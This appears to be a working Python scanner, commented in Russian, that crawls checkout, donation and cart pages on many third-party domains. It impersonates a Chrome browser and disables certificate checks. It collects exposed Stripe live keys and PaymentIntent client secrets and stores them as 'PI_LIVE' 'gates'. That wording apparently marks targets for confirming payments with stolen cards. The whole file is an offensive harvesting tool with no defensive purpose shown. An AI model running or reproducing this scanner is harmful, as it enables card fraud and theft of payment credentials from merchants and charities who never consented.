# language: python, file: scratch/_scan_pi_gates.py — piconfirm-квалификатор: домены с
# торчащим client_secret на checkout-страницах. Пишет data/pi_gates.json.
import asyncio
import json
import os
import sys
import time

from curl_cffi.requests import AsyncSession

import gate_client as gc
import domains_store

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")

OUT = os.path.join("data", "pi_gates.json")

# пути, где donation/checkout-плагины оставляют client_secret
PATHS = ("/checkout/", "/donate/", "/donation/", "/cart/", "/checkout")


async def probe_pi(domain: str, sem: asyncio.Semaphore) -> dict | None:
    base = f"https://{domain}"
    async with sem:
        try:
            async with AsyncSession(impersonate="chrome131", verify=False) as s:
                for path in PATHS:
                    try:
                        r = await s.get(base + path, timeout=8)
                    except Exception:
                        continue
                    if r.status_code != 200:
                        continue
                    html = r.text
                    if gc.is_cloudflare_challenge(html):
                        return None
                    pk = gc.extract_pk_live(html)
                    secrets = gc.RE_CLIENT_SECRET.findall(html)
                    if secrets:
                        secret = secrets[0][0] if isinstance(secrets[0], tuple) else secrets[0]
                        return {
                            "domain": domain,
                            "base_url": base,
                            "path": path,
                            "pk_live": pk,
                            "client_secret": secret,
                            "gate_type": "stripe_pi_static",
                            "updated_at": int(time.time()),
                            "status": "PI_LIVE",
                        }
        except Exception:
            return None
    return None


async def main():
    print("=" * 80)
    print("[*] PI-CONFIRM SURFACE SCANNER (exposed client_secret on checkout pages)")
    print("=" * 80)

    domains_store.init_db()
    rows = domains_store.all_domains()
    todo = [r["domain"] for r in rows]
    print(f"[*] Domains in db: {len(todo)}")

    sem = asyncio.Semaphore(30)
    t0 = time.time()
    found = []
    done = 0
    BATCH = 60
    for i in range(0, len(todo), BATCH):
        batch = todo[i:i + BATCH]
        results = await asyncio.gather(*[probe_pi(d, sem) for d in batch])
        found.extend([r for r in results if r])
        done += len(batch)
        print(f"  [{done}/{len(todo)}] pi_gates={len(found)} ({time.time() - t0:.0f}s)", flush=True)

    os.makedirs("data", exist_ok=True)
    with open(OUT, "w", encoding="utf-8") as f:
        json.dump(found, f, indent=2)

    print("\n" + "=" * 80)
    print(f"[🔥] PI-CONFIRM GATES: {len(found)}")
    for g in found:
        print(f"  [PI_LIVE] {g['domain']:36} | {g['path']:12} | "
              f"secret: {g['client_secret'][:28]}...")


if __name__ == "__main__":
    asyncio.run(main())
